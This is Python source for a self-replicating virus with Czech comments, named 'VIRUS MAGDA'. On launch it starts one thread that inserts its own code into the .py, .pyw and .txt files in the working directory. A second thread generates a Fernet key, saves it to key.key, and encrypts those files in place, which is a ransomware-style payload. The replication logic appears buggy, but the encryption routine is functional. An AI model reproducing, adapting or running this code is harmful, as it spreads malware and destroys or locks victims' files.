#VIRUS MAGDA
import sys
import glob
from cryptography.fernet import Fernet   #Implementace symetrické kryptografie
import os
import threading    #Zajistí, aby mohlo na PC jet více procesů najednou tzn. vytvoření vlákna

def Replicate ():  
    """Tato funkce zajistí replikaci viru"""

    Virus = []   #Vytvoření prostoru pro uložení kódu viru

    script = open(sys.argv[0], "r")  #Přečtení a uložení probíhajícího skriptu viru
    lines = script.readlines()
    script.close()        #Zavření skriptu"

    Nakazeny = False  #Zde definujeme oblast viru -> začíná nadpisem VIRUS MAGDA končí SBOHEM
    for line in lines:
        if line == "#VIRUS MAGDA":
            Nakazeny = True     
        if not Nakazeny:
            Virus.append(line)
        if line == "# SBOHEM \n":
            break

    pythonSoubory = glob.glob('*.py') + glob.glob('*.pyw') + glob.glob('*.txt')      #Zde hledám python soubory, které otevřeme, přečteme, zjistíme, zda je už soubor infikovaný (podle nadpisu VIRUS MAGDA)
    for file in pythonSoubory:      #Prohledání souborů v infikovaném počítači
        script = open(file, "r")
        Kod = script.readlines()
        script.close()

        Nakazeny = False

        for line in Kod:   #Pokud je kód již nakažený, opustíme cyklus
            if line == "#VIRUS MAGDA\n":
                Nakazeny = True
                break
            
        if not Nakazeny:     #Když kód zatím nakažený není, vložíme do něj náš virus
            NemocnyKod = []
            NemocnyKod.extend(Virus)
            NemocnyKod.extend('\n')
            NemocnyKod.extend(Kod)

            script = open(file, 'w')
            script.writelines(NemocnyKod)
            script.close()



def DoMaliciousThings():
	"""Zde jsou funkce samotného škodlivého kódu, jedná se o zašifrování souborů oběti (symetrické šifrování pomocí Fernet)"""
	print("You are infected")


def write_key():    
    """Vytvoření symetrického klíče, jež se nám vygeneruje do key souboru key.key"""
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)


def encrypt(filename, key):  
    """Proces  zašifrování"""
    f = Fernet(key)
    with open(filename, "rb") as file: 
        file_data = file.read() #precteme vsechna data
        encrypted_data = f.encrypt(file_data) #zasifrujeme data
    with open(filename, "wb") as file:
        file.write(encrypted_data) #vytvorime novy zasifrovany soubor

def load_key():    
    """Pro dešifrování potřebujeme stejný kód, kterým jsme soubory zašifrovali, tato funkce nám načte onen vygenerovaný klíč"""
    return open("key.key", "rb").read()

def DoMaliciousThings():
    write_key() #vytvoříme klíč
    key = load_key() #načteme klíč
    pythonSoubory2 = glob.glob('*.py') + glob.glob('*.pyw')+ glob.glob('*.txt') #projdeme soubory, po nalezení souborů s uvedenými koncovkami dojde k zašifrování
    for file in pythonSoubory2:
        encrypt (file,key)


y = threading.Thread(target=Replicate)			
y.start()							
x = threading.Thread(target=DoMaliciousThings, daemon=True)	
x.start()
#SBOHEM

